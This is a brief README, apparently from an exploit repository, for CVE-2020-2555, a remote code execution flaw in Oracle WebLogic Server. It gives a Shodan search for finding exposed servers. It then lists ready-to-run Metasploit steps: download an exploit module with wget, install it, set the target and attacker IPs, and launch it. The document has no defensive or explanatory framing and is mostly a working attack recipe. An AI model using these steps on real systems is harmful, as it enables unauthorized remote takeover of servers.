# CVE-2020-2555

![](https://img.shields.io/static/v1?label=Product&message=Oracle%20WebLogicServer&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=3.7.1.0,%2012.1.3.0.0,%2012.2.1.3.0%20and%2012.2.1.4.0&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:%209.8.%20Remote%20Code%20Execution&color=red)



 - Shodan dork:
```
product:"Oracle WebLogic Server"
```


### Metasploit Framework
```
wget https://raw.githubusercontent.com/getdrive/PoC/main/2020/WebLogic_Server_Deserialization_RCE/weblogic_deserialize_badattrval.rb
```
```
cp weblogic_deserialize_badattrval.rb /usr/share/metasploit-framework/modules/exploits/multi/misc/
```
```
msfdb reinit; msfconsole -q
```
```
use exploits/multi/misc/weblogic_deserialize_badattrval.rb
```
```
exploit(multi/misc/weblogic_deserialize_badattrval) > set rhosts target_IP
exploit(multi/misc/weblogic_deserialize_badattrval) > set lhost attacker_IP
exploit(multi/misc/weblogic_deserialize_badattrval) > run
```
